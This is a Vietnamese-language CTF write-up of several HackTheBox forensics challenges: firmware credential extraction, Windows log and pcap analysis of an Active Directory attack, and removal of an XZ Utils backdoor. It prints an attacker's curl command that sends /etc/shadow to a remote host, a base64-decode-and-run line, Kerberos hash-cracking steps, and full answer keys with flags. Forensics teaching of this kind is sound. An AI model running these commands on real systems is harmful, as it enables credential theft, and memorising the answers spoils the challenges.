# __**HackTheBox Business CTF 2024 - The Vault Of Hope [Forensics]**__

## _Silicon Data Sleuthing_

Bài cho 1 file firmware OpenWrt, nhiệm vụ là tìm hiểu thông tin có trong file và trả lời câu hỏi để lấy flag. Mình sử dụng `binwalk` để extract file firmware
```
binwalk -e chal_router_dump.bin
```
### What version of OpenWRT runs on the router (ex: 21.02.0)
Có nhiều chỗ để tìm version của firmware OpenWrt. Ở đây mình mở file `banner` trong `/squashfs-root/etc/` ra để đọc
```
  _______                     ________        __
 |       |.-----.-----.-----.|  |  |  |.----.|  |_
 |   -   ||  _  |  -__|     ||  |  |  ||   _||   _|
 |_______||   __|_____|__|__||________||__|  |____|
          |__| W I R E L E S S   F R E E D O M
 -----------------------------------------------------
 OpenWrt 23.05.0, r23497-6637af95aa
 -----------------------------------------------------
```
### What is the Linux kernel version (ex: 5.4.143)
Cũng có nhiều chỗ để tìm Linux kernel version của firmware OpenWrt như folder trong `/lib/modules/` hay ở trong `/usr/lib/opkg/status` (các packages đã cài thường có thông tin về kernel version). Nhưng mình chọn cách đọc Release Notes của OpenWrt phiên bản này cho nhanh :V [OpenWrt 23.05.0, r23497-6637af95aa](https://openwrt.org/releases/23.05/notes-23.05.0)

![image](https://hackmd.io/_uploads/BJ2nTqnmA.png)

### What's the hash of the root account's password, enter the whole line (ex: `root:$2$JgiaOAai....`)
Nếu tìm trong `squashfs-root` thì không thể tìm thấy password hash, vì đây chỉ là phân vùng read-only, còn toàn bộ thay đổi về configuragtions được lưu trong phân vùng `overlay` được định dạng `JFFS2`
![image](https://hackmd.io/_uploads/B1p7bo2m0.png)

![image](https://hackmd.io/_uploads/S1JR-o3X0.png)

Để extract phân vùng này ta dùng [jefferson](https://github.com/sviehb/jefferson)

Sau khi extract thì ta vào `/work/work/` và đọc file `#32` (đây là file `shadow`) là có hash của root account, hoặc có thể giải nén `sysupgrade.tgz` trong `/upper/` là có nguyên folder `etc`. Mình dùng cách thứ 2
### What is the PPPoE username
Ở trong `/etc/config/` file `network` chứa thông tin này
```
config interface 'wan'
	option device 'wan'
	option proto 'pppoe'
	option username 'yohZ5ah'
	option password 'ae-h+i$i^Ngohroorie!bieng6kee7oh'
	option ipv6 'auto'
```
### What is the PPPoE password
Nằm cùng với username trong file `network` trên
### What is the WiFi SSID
Cũng ở folder `/config`, trong file `wireless` chứa thông tin WiFi
```
config wifi-iface 'default_radio1'
	option device 'radio1'
	option network 'lan'
	option mode 'ap'
	option ssid 'VLT-AP01'
	option encryption 'sae-mixed'
	option key 'french-halves-vehicular-favorable'
	option ieee80211r '1'
	option ft_over_ds '0'
	option wpa_disable_eapol_key_retries '1'
```
### What is the WiFi Password
Nằm cùng trong file `wireless` trên
### What are the 3 WAN ports that redirect traffic from WAN -> LAN (numerically sorted, comma sperated: 1488,8441,19990)
Vẫn trong folder `config`, file `firewall` chứa redirect configuration cần tìm
```
config redirect
	option dest 'lan'
	option target 'DNAT'
	option name 'DB'
	option src 'wan'
	option src_dport '1778'
	option dest_ip '192.168.1.184'
	option dest_port '5881'

config redirect
	option dest 'lan'
	option target 'DNAT'
	option name 'WEB'
	option src 'wan'
	option src_dport '2289'
	option dest_ip '192.168.1.119'
	option dest_port '9889'

config redirect
	option dest 'lan'
	option target 'DNAT'
	option name 'NAS'
	option src 'wan'
	option src_dport '8088'
	option dest_ip '192.168.1.166'
	option dest_port '4431'
```

Dưới đây là toàn bộ câu hỏi và đáp án của bài:

```
+------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
|         Title          |                                                                                       Description                                                                                        |
+------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Silicon Data Sleuthing |                         In the dust and sand surrounding the vault, you unearth a rusty PCB... You try to read the etched print, it says Open..W...RT, a router!                         |
|                        |                                                         You hand it over to the hardware gurus and to their surprise the ROM Chip is intact!                                             |
|                        |                                                    They manage to read the data off the tarnished silicon and they give you back a firmware image.                                       |
|                        |              It's now your job to examine the firmware and maybe recover some useful information that will be important for unlocking and bypassing some of the vault's countermeasures! |
+------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

What version of OpenWRT runs on the router (ex: 21.02.0)
> 23.05.0                                                                                                                                                                                        
[+] Correct!
                                                                                                                                                                                                 
What is the Linux kernel version (ex: 5.4.143)                                                                                                                                                   
> 5.15.134                                                                                                                                                                                       
[+] Correct!
                                                                                                                                                                                                 
What's the hash of the root account's password, enter the whole line (ex: root:$2$JgiaOAai....)                                                                                                  
> root:$1$YfuRJudo$cXCiIJXn9fWLIt8WY2Okp1:19804:0:99999:7:::                                                                                                                                     
[+] Correct!
                                                                                                                                                                                                 
What is the PPPoE username                                                                                                                                                                       
> yohZ5ah                                                                                                                                                                                        
[+] Correct!
                                                                                                                                                                                                 
What is the PPPoE password                                                                                                                                                                       
> ae-h+i$i^Ngohroorie!bieng6kee7oh                                                                                                                                                               
[+] Correct!
                                                                                                                                                                                                 
What is the WiFi SSID                                                                                                                                                                            
> VLT-AP01                                                                                                                                                                                       
[+] Correct!
                                                                                                                                                                                                 
What is the WiFi Password                                                                                                                                                                        
> french-halves-vehicular-favorable                                                                                                                                                              
[+] Correct!
                                                                                                                                                                                                 
What are the 3 WAN ports that redirect traffic from WAN -> LAN (numerically sorted, comma sperated: 1488,8441,19990)                                                                             
> 1778,2289,8088                                                                                                                                                                                 
[+] Correct!
                                                                                                                                                                                                 
[+] Here is the flag: HTB{Y0u'v3_m4st3r3d_0p3nWRT_d4t4_3xtr4ct10n!!_cff2b8a17b727a23acefa92dcaa528ec}                                                                                            
```
## _Caving_
Bài cho ta folder log events của Windows. Mình dùng Hayabusa với command csv-timeline để chuyển log qua dạng csv và Timeline Explorer để lọc log ra đọc những event đáng chú ý (hoặc có thể đọc chay nma mình lười ;-;)
Sau khi mở file csv được lọc ta thấy ngay được 1 log cảnh báo`Suspicious Powershell Download`

![image](https://hackmd.io/_uploads/B19hgSMEA.png)

![image](https://hackmd.io/_uploads/rk3xZrfNA.png)

Decode base64 đoạn Cookie `f=SFRCezFudHJ1UzEwbl9kM3QzY3QzZF8hISF9` ra ta lấy được flag

![image](https://hackmd.io/_uploads/Bkpw-SfNC.png)

## _Tangled Heist_

Bài cho ta 1 file network capture. Mình dùng Wireshark để phân tích.

### Which is the username of the compromised user used to conduct the attack? (for example: username)
Ở packet thứ 10 ta có thể thấy username `Copper` trong mục `NTLMSSP_AUTH`, bên cạnh đó trong cả file network capture chỉ có 2 IP qua lại là `10.10.10.43` (là user) và `10.10.10.100` (là server)

![image](https://hackmd.io/_uploads/ByiIBSMEA.png)


### What is the Distinguished Name (DN) of the Domain Controller? Don't put spaces between commas. (for example: CN=...,CN=...,DC=...,DC=...)

Sử dụng filter `ldap contains "Domain Controllers"` ta lọc được packet có chứa thông tin về `Distinguished Name`

![image](https://hackmd.io/_uploads/BycmvSfNR.png)

### Which is the Domain managed by the Domain Controller? (for example: corp.domain)

Kết hợp thông tin ở câu 1 và câu 2 ta có thể thấy được Domain name là `recorp.htb`

### How many failed login attempts are recorded on the user account named 'Ranger'? (for example: 6)
Sử dụng filter `ldap contains "Ranger"`, ta thấy được packet chứa thông tin về số lần nhập sai mật khẩu ở mục `badPwdCount`

![image](https://hackmd.io/_uploads/BygvkYBzEA.png)

### Which LDAP query was executed to find all groups? (for example: (object=value))
Biết rằng lệnh do attacker execute, ta sử dụng filter `ip.src==10.10.10.43 && ldap contains "group"` là tìm được đáp án

![image](https://hackmd.io/_uploads/HyUy5BM4A.png)

### How many non-standard groups exist? (for example: 1)
Sử dụng filter `ldap contains "group"`, ở cuối ta thấy được 5 groups có tên "không bình thường lắm" (packet 347 chứa thông tin của 2 groups).

![image](https://hackmd.io/_uploads/H1hl2SfV0.png)

### One of the non-standard users is flagged as 'disabled', which is it? (for example: username)

Để tìm được đáp án, ta kiểm tra mục "userAccountControl", mình sử dụng thêm [tool này](https://www.techjutsu.ca/uac-decoder) để biết được tham số của disbled account là gì và tìm được đáp án là `Radiation`

![image](https://hackmd.io/_uploads/H1ZpZUfVA.png)

![image](https://hackmd.io/_uploads/By8XMUf4A.png)

### The attacker targeted one user writing some data inside a specific field. Which is the field name? (for example: field_name)
Ở packet 669 có một modify request đến từ ip của attacker và thông tin bị modify nằm trong `wWWHomePage`

![image](https://hackmd.io/_uploads/rJVPXLfER.png)

### Which is the new value written in it? (for example: value123)
Cũng ở trong packet trên ta tìm được thông tin bị modify là `http://rebcorp.htb/qPvAdQ.php`

### The attacker created a new user for persistence. Which is the username and the assigned group? Don't put spaces in the answer (for example: username,group)
Ở packet 671 ta thấy request add thêm user `B4ck` và ở packet 675 ta thấy user `B4ck` trong group `Enclave`

![image](https://hackmd.io/_uploads/S1fn4IMVA.png)

### The attacker obtained an hash for the user 'Hurricane' that has the UF_DONT_REQUIRE_PREAUTH flag set. Which is the correspondent plaintext for that hash?  (for example: plaintext_password)
![image](https://hackmd.io/_uploads/H1ZvDIfNC.png)

Ở packet 684 và 685 ta thấy 2 protocol là `KRB5` (kerberos), và để extract và lấy được password mình sử dụng [krb2john](https://github.com/openwall/john/blob/bleeding-jumbo/run/krb2john.py) và `john`

Theo hướng dẫn của krb2john:
```
For extracting "AS-REQ (krb-as-req)" hashes,
tshark -r AD-capture-2.pcapng -T pdml > data.pdml
tshark -2 -r test.pcap -R "tcp.dstport==88 or udp.dstport==88" -T pdml >> data.pdml
./run/krb2john.py data.pdml
```
![Screenshot 2024-05-23 205847](https://hackmd.io/_uploads/BJrdD8zVA.png)


Dưới đây là toàn bộ câu hỏi và đáp án của bài:
```
+---------------+-----------------------------------------------------------------------------------------------------------------------------------------+
|     Title     |                                                               Description                                                               |
+---------------+-----------------------------------------------------------------------------------------------------------------------------------------+
| Tangled Heist |                          The survivors' group has meticulously planned the mission 'Tangled Heist' for months.                          |
|               |                                 In the desolate wasteland, what appears to be an abandoned facility is,                                 |
|               |                                             in reality, the headquarters of a rebel faction.                                            |
|               |                              This faction guards valuable data that could be useful in reaching the vault.                              |
|               |            Kaila, acting as an undercover agent, successfully infiltrates the facility using a rebel faction member's account           |
|               |                                 and gains access to a critical asset containing invaluable information.                                 |
|               | This data holds the key to both understanding the rebel faction's organization and advancing the survivors' mission to reach the vault. |
|               |                                                     Can you help her with this task?                                                    |
+---------------+-----------------------------------------------------------------------------------------------------------------------------------------+

[1/11] Which is the username of the compromised user used to conduct the attack? (for example: username)
> Copper                                                                                                                                                                                         
[+] Correct!
                                                                                                                                                                                                 
[2/11] What is the Distinguished Name (DN) of the Domain Controller? Don't put spaces between commas. (for example: CN=...,CN=...,DC=...,DC=...)                                                 
> CN=SRV195,OU=Domain Controllers,DC=rebcorp,DC=htb                                                                                                                                              
[+] Correct!
                                                                                                                                                                                                 
[3/11] Which is the Domain managed by the Domain Controller? (for example: corp.domain)                                                                                                          
> rebcorp.htb                                                                                                                                                                                    
[+] Correct!
                                                                                                                                                                                                 
[4/11] How many failed login attempts are recorded on the user account named 'Ranger'? (for example: 6)                                                                                          
> 14                                                                                                                                                                                             
[+] Correct!
                                                                                                                                                                                                 
[5/11] Which LDAP query was executed to find all groups? (for example: (object=value))                                                                                                           
> (objectClass=group)                                                                                                                                                                            
[+] Correct!
                                                                                                                                                                                                 
[6/11] How many non-standard groups exist? (for example: 1)                                                                                                                                      
> 5                                                                                                                                                                                              
[+] Correct!
                                                                                                                                                                                                 
[7/11] One of the non-standard users is flagged as 'disabled', which is it? (for example: username)                                                                                              
> Radiation                                                                                                                                                                                      
[+] Correct!
                                                                                                                                                                                                 
[8/11] The attacker targeted one user writing some data inside a specific field. Which is the field name? (for example: field_name)                                                              
> wWWHomePage                                                                                                                                                                                    
[+] Correct!
                                                                                                                                                                                                 
[9/11] Which is the new value written in it? (for example: value123)                                                                                                                             
> http://rebcorp.htb/qPvAdQ.php                                                                                                                                                                  
[+] Correct!
                                                                                                                                                                                                 
[10/11] The attacker created a new user for persistence. Which is the username and the assigned group? Don't put spaces in the answer (for example: username,group)                              
> B4ck,Enclave                                                                                                                                                                                   
[+] Correct!
                                                                                                                                                                                                 
[11/11] The attacker obtained an hash for the user 'Hurricane' that has the UF_DONT_REQUIRE_PREAUTH flag set. Which is the correspondent plaintext for that hash?  (for example: plaintext_password)                                                                                                                                                                                              
> april18                                                                                                                                                                                        
[+] Correct!
                                                                                                                                                                                                 
[+] Here is the flag: HTB{1nf0rm4t10n_g4th3r3d_265df1a261c0453c2f5cf070a25a216c}                                                                                                                 
```

## _Mitigation_

Bài cho 1 instance Linux, connect vào và tìm cách loại bỏ backdoor
Đầu tiên mình dùng pspy để kiểm tra các process đang chạy trên instance. Liên tục là những sessions SSH được connect vào server, và thực hiện shell script, trong đó có 1 đoạn đáng chú ý:
`CMD: UID=0     PID=388    | sh -c cat /tmp/.c|base64 -d|sh`
Đoạn lệnh này đọc file `.c` trong `/tmp`, sau đó decode base64 ra và thực thi. Mình mở file ra để đọc thử thì thấy nội dung như sau:
```
curl -X POST -d "data=$(base64 /etc/shadow)&i=$(hostname -I | awk '{print $1}')" https://vault.htb/hashes/save
```
Dấu hiệu của việc có backdoor kết nối ssh tới server linux làm mình nhớ tới [XZ Utils backdoor](https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27) hay [CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094), một lỗ hổng được phát hiện gần đây trong thư viện `liblzma`, cụ thể trong 2 phiên bản 5.6.0 và 5.6.1. Và ở trên server Linux của bài, phiên bản 5.6.1-1 đã được cài đặt
```
root@5a349bb86666:~# dpkg -l | grep liblzma
ii  liblzma5:amd64              5.6.1-1               amd64        XZ-format compression library
```
Và mình đã tiến hành update thư viện `liblzma` lên phiên bản mới nhất hiện tại (hoặc cũng có thể downgrade về bản cũ hơn) [tại đây](https://snapshot.debian.org/package/xz-utils/5.6.1%2Breally5.4.5-1/)
```
root@5a349bb86666:~# dpkg -i liblzma5_5.6.1+really5.4.5-1_amd64.deb 
Selecting previously unselected package liblzma5:amd64.
(Reading database ... 7594 files and directories currently installed.)
Preparing to unpack liblzma5_5.6.1+really5.4.5-1_amd64.deb ...
Unpacking liblzma5:amd64 (5.6.1+really5.4.5-1) over (5.6.1-1) ...
Setting up liblzma5:amd64 (5.6.1+really5.4.5-1) ...
Processing triggers for libc-bin (2.36-9+deb12u7) ...
```
Sau khi update xong 1 lúc thì có thông báo backdoor đã bị loại bỏ trên server
```
Broadcast message from root@5a349bb86666 (somewhere) (Thu May 23 09:10:38 2024)
                                                                               
Backdoor eliminated! Check /
```
Vào root và đọc flag thôi
```
root@5a349bb86666:~# cd /
root@5a349bb86666:/# ls
bin  boot  dev  etc  flag.txt  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
root@5a349bb86666:/# cat flag.txt
HTB{oH_xZ_w3_f0uNd_tH3_b4cKd0or}
```


<!---
Counter Defensive
```
+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+
|       Title       |                                                                       Description                                                                       |
+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+
| Counter Defensive |                                      As your crew prepares to infiltrate the vault, a critical discovery is made:                                       |
|                   |                     An opposing faction has embedded malware within a workstation in your infrastructure, targeting invaluable strategic plans.         |
|                   |             Your task is to dissect the compromised system, trace the malware's operational blueprint, and uncover the method of these remote attacks.  |
|                   |                                                Reveal how the enemy monitors and controls their malicious software.                                     |
|                   |                          Understanding their tactics is key to securing your plans and ensuring the success of your mission to the vault.               |
|                   |                                               To get the flag, spawn the docker instance and answer to the questions!                                   |
+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+

[1/10] What time did the victim finish downloading the Black-Myth-Wukong64bit.exe file? Please, submit the epoch timestamp. (ie: 168061519)
> 1713451126
[+] Correct!

[2/10] What is the full malicious command which is run whenever the user logs in? (ignore explorer.exe, ie: nc.exe 8.8.8.8 4444)
> %PWS% -nop -w h "start "$env:temp\wct98BG.tmp""
[+] Correct!

[3/10] Referring to the previous file, 'wct98BG.tmp', what is the first process that starts when the malicious file is opened? (ie: svhost.exe)
> mshta.exe
[+] Correct!

[4/10] What is the value of the variable named **cRkDgAkkUElXsDMMNfwvB3** that you get after decoding the first payload? (ie: randomvalue)
> CbO8GOb9qJiK3txOD4I31x553g
[+] Correct!

[5/10] What algorithm/encryption scheme is used in the final payload? (ie: RC4)
> AES
[+] Correct!

[6/10] What is the full path of the key containing the password to derive the encryption key? (ie: HKEY_LOCAL_MACHINE\SAM\SAM\LastSkuUpgrade)
> HKEY_CURRENT_USER\software\classes\Interface\{a7126d4c-f492-4eb9-8a2a-f673dbdd3334}\TypeLib
[+] Correct!

[7/10] What is the attacker's Telegram username? (ie: username)
> Pirate_D_Mylan
[+] Correct!

[8/10] What day did the attacker's server first send a 'new-connection' message? (Format: DD/MM/YYYY)
> 18/04/2024
[+] Correct!
                                                                                                                                                                                                 
[9/10] What's the password for the 7z archive                                                                                                                                                    
> arameter-none                                                                                                                                                                                  
[+] Correct!
                                                                                                                                                                                                 
[10/10] Submit the md5sum of the 2 files in the archive that the attacker exfiltrated (sort hashes, connect with '_', ie: 5f19a..._d9fc0...)                                                     
> 83aa3b16ba6a648c133839c8f4af6af9_ffcedf790ce7fe09e858a7ee51773bcd                                                                                                                              
[+] Correct!
                                                                                                                                                                                                 
[+] Here is the flag: HTB{t3l3gr4m_b4ckf1r3d!!!_9628c067df4b91776081d336bc81cecb}
```
-->